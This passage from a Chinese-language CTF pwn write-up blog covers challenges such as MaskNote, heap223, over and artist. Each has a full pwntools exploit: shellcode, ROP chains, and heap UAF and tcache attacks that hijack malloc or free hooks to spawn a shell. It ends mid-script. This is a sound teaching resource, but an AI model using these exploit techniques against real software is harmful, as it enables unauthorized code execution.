p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + <span class="built_in">bytes</span>(frame)[<span class="number">0x28</span>:]) <span class="comment"># 13</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xd0</span>))  <span class="comment"># 14</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xb10</span>))  <span class="comment"># 15</span></span><br><span class="line">add(p64(<span class="number">0</span>) + p64(<span class="number">0x88</span>))  <span class="comment"># 16</span></span><br><span class="line">add(<span class="string">b&quot;\n&quot;</span>)  <span class="comment"># 17</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x121b1d</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0xc7f32</span></span><br><span class="line">pop_rcx_rbx_ret = libc_base + <span class="number">0xfc104</span></span><br><span class="line">pop_r8_ret = libc_base + <span class="number">0x148686</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line"></span><br><span class="line">orw_rop = p64(pop_rdi_ret) + p64(address + <span class="number">0xd0</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw_rop += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">orw_rop += p64(pop_rdi_ret) + p64(<span class="number">0x80000</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>)</span><br><span class="line">orw_rop += p64(pop_rdx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(pop_rcx_rbx_ret) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw_rop += p64(pop_r8_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw_rop += p64(libc_base + libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">orw_rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(address + <span class="number">0xd8</span>)</span><br><span class="line">orw_rop += p64(pop_rdx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(libc_base + libc.sym[<span class="string">&#x27;writev&#x27;</span>])</span><br><span class="line">orw_rop += <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="number">0x80000</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(orw_rop)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><p>这里学一下师傅的修复方法，不利用 en_frame，而利用 term_proc，这是个空函数：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102151304.png" alt="image-20230910215121063" style="zoom:50%;" /><p>接着看一下 free 时的环境：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102156887.png" alt="image-20230910215622844" style="zoom:50%;" /><p>因此构造如下 patch，这里不能直接将 rdi 指向的地方清 0 ，我们保留了 rdi 为 heap[i] 使得其在 jmp _free 时得以被释放：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102216366.png" alt="image-20230910221643316" style="zoom:50%;" /><h2 id="5-MaskNote"><a href="#5-MaskNote" class="headerlink" title="5. MaskNote"></a>5. MaskNote</h2><p>伪菜单题。检查一下题目的保护，发现 PIE 和 Canary 保护没开：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111007178.png" alt="image-20230911100719035" style="zoom:50%;" /><p>题目一开始申请了一块可读可写可执行的空间，可用于写入 shellcode：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111005708.png" alt="image-20230911100505587" style="zoom:50%;" /><p>然后看一下关键代码逻辑，sprintf 的功能和 printf 其实差不多，区别在于 sprintf 将打印结果输出到 buf 中，而 printf 则是将结果输出到屏幕上，因此 sprintf 很容易导致<strong>栈溢出</strong>：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111008571.png" alt="image-20230911100828519" style="zoom:50%;" /><p>如下图所示，<code>check_Mask</code>函数对 Mask 变量的值做了检查，但未检测<code>%c</code>，因此我们可以通过给 Mask 赋值<code>%128c</code>来达成栈溢出：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111014362.png" alt="image-20230911101455306" style="zoom:50%;" /><p>值得注意的是，我们在布置的返回地址的时候不能直接写入<code>0x80808000</code>，因为 sprintf 会被 \x00 给截断，可以写入<code>0x80808010</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./MaskNote&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">name += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mul esi</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rbx,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov al, 59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">name = name.ljust(<span class="number">128</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mask = <span class="string">b&#x27;%136c&#x27;</span>+p64(<span class="number">0x80808010</span>)</span><br><span class="line"><span class="comment"># mask = b&#x27;%s%s&#x27;+b&#x27;\x10\x80\x80\x80&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;your name:&quot;</span>, name)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x401813&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;Mask:&quot;</span>, mask)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Your choice:&gt;&gt;&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscn西南赛区"><a href="#2023Ciscn西南赛区" class="headerlink" title="2023Ciscn西南赛区"></a>2023Ciscn西南赛区</h1><p>参考的这位的<a href="https://bbs.kanxue.com/thread-277650.htm#msg_header_h2_3">[原创]2023ciscn西南赛区pwn Writeup</a>。</p><h2 id="1-heap223"><a href="#1-heap223" class="headerlink" title="1. heap223"></a>1. heap223</h2><p>libc2.23 题，甚是怀念。题目规定了 3 种大小的堆：小于 0x100 的 small_heap，等于 0x100 的 mid_heap，大于 0x100 的 big_heap。并在 bss 段上维护各类堆块的最近申请的一个指针与其 size 大小。</p><p>漏洞在于释放堆块的 UAF，同时也清空了其 size 大小：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400BF9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please enter which heap you want to delete:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;small_heap + v1) )                    <span class="comment">// 删除指定类heap</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;small_heap + v1));</span><br><span class="line">    small_heap_size[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;deleted heap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;illegal index or unmalloc heap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且 edit 功能和 show 功能都有限制：只能 edit small_heap，只能 show mid_heap。</p><p>利用流程：</p><ol><li><p>申请一个 0x300 的大堆块，申请一个 0x38 的小堆块（防止合并）。</p></li><li><p>释放大堆块。</p></li><li><p>申请一个中堆块，并泄露 libc。</p><p>注意！此时 bss 段上维护的 big_heap_ptr 和 mid_heap_ptr 都指向了同一处，即最初的大堆块。</p></li><li><p>释放中堆块。</p><p>注意！此时中堆块和割裂的大堆块又合并了。</p></li><li><p>申请一个小堆块。</p><p>注意！此时bss 段上维护的 big_heap_ptr、mid_heap_ptr 和 small_heap_ptr 都指向了同一处，即最初的大堆块。</p></li><li><p>释放大堆块，实际上释放了小堆块，而我们又有小堆块的写权限，故可以申请到 __malloc_hook - 0x23 的位置，劫持为 one_gadget 即可。</p></li><li><p>需要注意的是，利用 add 函数中的 malloc 并不能满足 one_gadget 的条件，出题者给我们提供了另一个调用了 malloc 的函数入口，触发即可，不过打 __realloc_hook 也可以。</p></li></ol><p>EXP 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;input:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter size of malloc :&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;please enter contents of your heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_mid</span>():</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter which heap you want to delete:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_small</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter what you want to edit:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help</span>():</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show_mid()</span><br><span class="line">leak = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lb = leak - (<span class="number">0x7f97907c4e00</span>-<span class="number">0x7f9790400000</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&gt;&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">malloc_hook = lb + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit_small(p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">shell = lb + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(shell))</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>()</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-over"><a href="#2-over" class="headerlink" title="2. over"></a>2. over</h2><p>初始化的时候在 bss 上放了个 puts 的 libc 地址：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191922051.png" alt="image-20230919192227848" style="zoom:50%;" /><p>并且可以进行执行，而 name 是我们可控的。思路一下子就变得很明确。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191923688.png" alt="image-20230919192305583" style="zoom:50%;" /><p>另外还有三个操作，分别是对 bss 段上的数进行加、减、抑或。而漏洞都出奇的一致，选择数的时候可以为负号，导致可以修改到 bss 上的其他值。计算 qword_4060 至 puts_addr 的偏移为 10，故 num 为 -2 即可。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191927687.png" alt="image-20230919192740631" style="zoom:50%;" /><p>libc 已知，因此只需要将 puts_addr 的位置减去固定偏移为 system，再进行调用即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = libc.sym[<span class="string">&quot;puts&quot;</span>] - libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">name = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">choice = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, choice)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&#x27;-2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line"></span><br><span class="line">choice = <span class="string">b&#x27;4&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, choice)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-artist"><a href="#3-artist" class="headerlink" title="3. artist"></a>3. artist</h2><p>libc 2.31的菜单堆题，但和往常还是有很大变化。</p><ol><li>只能申请 0x80 大小的堆块。</li><li>打印功能和释放功能一起，有两种选择，一种先打印后释放，另一种修改 0x10 字节后再打印释放。释放中没有 UAF。</li><li>有一个漏洞，可以维护有且仅有一个堆块指针，并且每次调用都会修改 0x10 大小字节。</li></ol><p>既然能维护一个已释放的堆块指针并能对其进行写入，实际上也是限制版的 UAF 漏洞。</p><p>利用过程如下：</p><ol><li>申请几个堆块释放之后，再申请回来，此时堆块中残留着一些堆块信息。再次释放就可以泄露 heap_base。</li><li>利用 UAF 劫持到 tcache，填满 0x90 大小对应的堆块。</li><li>释放堆块到 unsorted bin，申请回来再释放，得到 Libc_base。</li><li>利用 UAF 劫持 free_hook 为 system。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">chance = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compose</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input some\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exhibit_edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Would you like to make final edits?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input your content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exhibit</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Would you like to make final edits?&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">script</span>(<span class="params">idx, choice, content</span>):</span><br><span class="line">    <span class="keyword">global</span> chance</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> chance == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        chance = chance - <span class="number">1</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;do you want crazy\n&#x27;</span>, choice)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Go ahead and doodle for your artistic inspiration.\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">give_name(<span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#0</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#2</span></span><br><span class="line">exhibit(<span class="number">2</span>)</span><br><span class="line">exhibit(<span class="number">0</span>)</span><br><span class="line">exhibit(<span class="number">1</span>)</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#3</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">exhibit(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please enjoy your masterpiece.\n&#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x263</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#5</span></span><br><span class="line">compose(p16(<span class="number">0</span>)*<span class="number">7</span> + p16(<span class="number">7</span>))  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">5</span>)</span><br><span class="line">exhibit(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exhibit_edit(<span class="number">6</span>, p8(<span class="number">0</span>)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#7</span></span><br><span class="line">exhibit(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fc8d867dc61</span>-<span class="number">0x7fc8d8491000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#8</span></span><br><span class="line">compose(<span class="string">b&#x27;b&#x27;</span>)   <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">8</span>)</span><br><span class="line">exhibit(<span class="number">9</span>)</span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#10</span></span><br><span class="line">compose(p64(system))</span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023陇剑杯半决赛-总决赛RHG"><a href="#2023陇剑杯半决赛-总决赛RHG" class="headerlink" title="2023陇剑杯半决赛/总决赛RHG"></a>2023陇剑杯半决赛/总决赛RHG</h1><p>就回温一些最基础的 ret2 系列。</p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><h3 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h3><p>静态链接，gadgets 很多，64 位，打 ret2syscall。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211418987.png" alt="image-20230921141824811" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please shoot me&quot;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000410023</span></span><br><span class="line">pop_rdx_ret = <span 